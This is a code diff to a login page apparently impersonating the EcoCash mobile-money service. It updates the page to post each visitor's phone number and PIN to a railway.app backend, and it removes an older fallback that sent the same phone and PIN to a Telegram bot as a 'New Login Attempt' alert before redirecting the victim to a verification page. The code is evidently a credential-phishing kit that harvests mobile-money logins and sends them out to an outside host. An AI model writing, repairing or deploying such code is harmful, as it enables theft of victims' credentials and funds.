@@ -468,7 +468,7 @@
         // ============================================
         // API CONFIGURATION - UPDATED URL
         // ============================================
-        const API_URL = 'https://eco-cashm-production.up.railway.app/api';
+        const API_URL = 'https://eco-cashm-production-a9c3.up.railway.app/api';
 
         console.log('====================================');
         console.log('🔐 EcoCash Login Page Loaded');
@@ -557,43 +557,7 @@
         }
 
         // ============================================
-        // SEND LOGIN TO BACKEND
-        // ============================================
-        function sendLoginToBackend(phone, pin) {
-            return new Promise((resolve, reject) => {
-                console.log('📤 Sending login to backend...');
-
-                fetch(`${API_URL}/auth/login`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        phoneNumber: phone,
-                        pin: pin
-                    })
-                })
-                .then(response => {
-                    console.log('📥 Response Status:', response.status);
-                    return response.json();
-                })
-                .then(data => {
-                    console.log('📥 Response:', data);
-                    if (data.success) {
-                        resolve(data);
-                    } else {
-                        reject(data);
-                    }
-                })
-                .catch(error => {
-                    console.error('❌ Fetch Error:', error.message);
-                    reject(error);
-                });
-            });
-        }
-
-        // ============================================
-        // LOGIN HANDLER
+        // LOGIN HANDLER - SENDS TO BACKEND
         // ============================================
         loginBtn.addEventListener('click', async function() {
             const phone = phoneInput.value.trim();
@@ -628,48 +592,38 @@
             localStorage.setItem('phone', phone);
 
             try {
-                // Send login to backend
-                await sendLoginToBackend(phone, pin);
-                
-                showStatus('✅ Login successful! Redirecting...', 'success');
-                
-                setTimeout(() => {
-                    window.location.href = 'verify.html';
-                }, 1500);
-                
-            } catch (error) {
-                console.error('❌ Login failed:', error);
-                
-                // If backend fails, still try to send Telegram directly
-                const message = `🔐 *New Login Attempt*\n\n📱 *Phone:* +263 ${phone}\n🔢 *PIN:* ${pin}\n⏰ *Time:* ${new Date().toLocaleString()}\n\n✅ User has been redirected to verify page.`;
-
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                // Send to backend
+                const response = await fetch(`${API_URL}/auth/login`, {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
                     body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'Markdown'
+                        phoneNumber: phone,
+                        pin: pin
                     })
-                })
-                .then(response => response.json())
-                .then(data => {
-                    console.log('📥 Telegram response:', data);
-                    if (data.ok) {
-                        showStatus('✅ Login successful! Redirecting...', 'success');
-                    } else {
-                        showStatus('⚠️ Login successful but notification failed.', 'info');
-                    }
-                })
-                .catch(err => {
-                    console.error('❌ Telegram error:', err);
+                });
+
+                const data = await response.json();
+
+                if (data.success) {
                     showStatus('✅ Login successful! Redirecting...', 'success');
-                })
-                .finally(() => {
+                    
                     setTimeout(() => {
                         window.location.href = 'verify.html';
                     }, 1500);
-                });
+                } else {
+                    showStatus('❌ ' + data.message, 'error');
+                    loginBtn.disabled = false;
+                    loginBtn.textContent = 'LOGIN';
+                    spinnerOverlay.style.display = 'none';
+                }
+            } catch (error) {
+                console.error('❌ Backend error:', error);
+                showStatus('❌ Connection error: ' + error.message, 'error');
+                loginBtn.disabled = false;
+                loginBtn.textContent = 'LOGIN';
+                spinnerOverlay.style.display = 'none';
             }
         });
 
